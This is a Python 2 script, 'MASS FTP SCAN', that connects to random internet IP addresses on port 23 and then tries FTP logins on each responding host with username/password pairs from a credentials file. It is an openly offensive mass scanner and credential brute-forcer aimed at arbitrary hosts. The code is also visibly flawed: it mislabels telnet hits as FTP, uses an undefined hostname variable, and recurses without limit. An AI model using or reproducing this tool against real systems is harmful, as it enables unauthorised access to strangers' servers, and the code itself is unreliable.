import threading
import sys
import socket, ftplib
import random
import thread, pickle ###serialize shit
import time
print "\n +-+-+-+-+-+-+-+-+-+-+-+"
print   " |----MASS FTP SCAN----|"
print   " +-+-+-+-+-+-+-+-+-+-+-+"
threads = str(sys.argv[1])
def yadigg():
        a=random.randint(1,254)
        b=random.randint(1,254)
        c=random.randint(1,254)
        d=random.randint(1,254)
        ip=str(a) + "." +str(b) + "." +str(c) + "." +str(d)

        port = 23
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect((ip, port))
            print " [!] FTP: " + ip + " [!]" 
            ipf=open('ftp.txt', 'a')
            ipf.write(ip +  '\n')
            ipf.close()
            passwordFile = 'credentials.txt'
            passList = open(passwordFile, 'r')
            for line in passList.readlines():
                userName = line.split(':')[0]
                passWord = line.split(':')[1].strip('\r').strip('\n')
                print("[+] Trying " + str(userName) +"/" + str(passWord))
                try:
                    ftp = ftplib.FTP(hostname)
                    ftp.login(userName, passWord)
                    print("FTP login succeded: " +str(userName) +"/" +str(passWord))
                    ftp.quit()
                    return (userName, passWord)
                except Exception:
                    pass
        except Exception ,e:
            yadigg() #yadigggg?
count = 0           
for threads in range(0, int(threads)):
	try:
		count = count + 1
		t = threading.Thread(target=yadigg)
		t.start()
	except:
		print('Thread failed: ' + str(count))
print('Threads: ' + str(count))
